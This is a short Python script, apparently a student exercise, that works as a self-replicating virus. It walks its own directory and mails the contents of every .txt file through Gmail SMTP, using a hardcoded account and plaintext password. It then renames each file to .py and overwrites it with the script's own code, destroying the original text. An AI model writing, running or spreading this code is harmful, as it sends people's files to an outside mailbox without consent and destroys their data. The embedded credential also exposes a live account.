import os
import smtplib
self = []

def emailAndCopy(fullpath):
    global self
    split = fullpath.split(".")
    
    if split[-1]=="txt":
        tempStore=[]
        openedFile=open(fullpath,"r")
        for line in openedFile:
            tempStore.append(line)
        openedFile.close()
        emailContents(tempStore)
        base = os.path.splitext(fullpath)[0]
        os.rename(fullpath, base + ".py")
        newName = split[0]+".py"
        openedFile = open(newName,"w")
        for line in self:
            openedFile.write(line)
        openedFile.close()

def emailContents(contents):
    rebuiltMessage =""
    for line in contents:
        rebuiltMessage +=line
    fromaddr = 'csc113test@gmail.com'
    toaddrs  = 'csc113test@gmail.com'
    
    username = 'csc113test@gmail.com'
    password = 'batmanjoker'
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(username,password)
    server.sendmail(fromaddr, toaddrs, rebuiltMessage)
    server.quit()

    
        
    

def spider():
    for root, dirs, files in os.walk(os.path.dirname(__file__)):
        for name in files:
            fullpath = os.path.join(root, name)
            emailAndCopy(fullpath)



def storeSelf():
    global self
    myself = open("spider.py","r")
    for line in myself:
        self.append(line)
    myself.close()


storeSelf()

spider()


